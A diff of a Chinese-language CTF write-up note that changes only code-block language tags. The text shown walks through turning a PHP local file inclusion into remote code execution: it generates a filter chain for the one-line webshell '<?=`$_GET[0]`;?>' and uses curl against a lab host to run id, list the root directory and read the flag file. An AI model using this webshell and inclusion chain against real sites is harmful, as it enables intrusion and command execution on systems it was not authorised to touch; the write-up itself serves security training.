@@ -18,7 +18,7 @@
 	- php 含有 `include`
 	- 沒有上傳檔案或輸入字串的地方
 2. 題目 LFI2RCE -> 考慮重寫一個已確定存在檔案（ex: `./page/apple.php`），利用工具 [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) 產生 慾寫入程式（ex: ```<?=`$_GET[0]`;?> ```）的 filter chain
-   ```
+   ```bash
    python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;?>'
    ```
    ![[W1-10_filter-chain.png]]
@@ -28,7 +28,7 @@
    CHAIN=$(python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;?>' | tail -n 1)
    ```
 3. 替換 `$_GET[0]` 的指令為 `id` 進行測試
-   ```
+   ```powershell
    curl -sG "http://chals1:20009/" \
 	  --data-urlencode "page=$CHAIN" \
 	  --data-urlencode "0=id" \
@@ -37,12 +37,12 @@
    ![[W1-10_id.png]]
    可以從大量雜訊中找到 id 指令執行成功
 4. 依照提示列出根目錄
-   ```
+   ```powershell
    curl -sG "http://chals1:20009/"   --data-urlencode "page=$CHAIN"   --data-urlencode "0=ls -la /"   --output -
    ```
    ![[W1-10_root.png|458]]
 5. 讀取檔案
-   ```
+   ```powershell
     curl -sG "http://chals1:20009/"   --data-urlencode "page=$CHAIN"   --data-urlencode "0=grep "CTF"  /flag_23fb1b3"   --output -
    ```
    ![[W1-10_flag.png|454]]
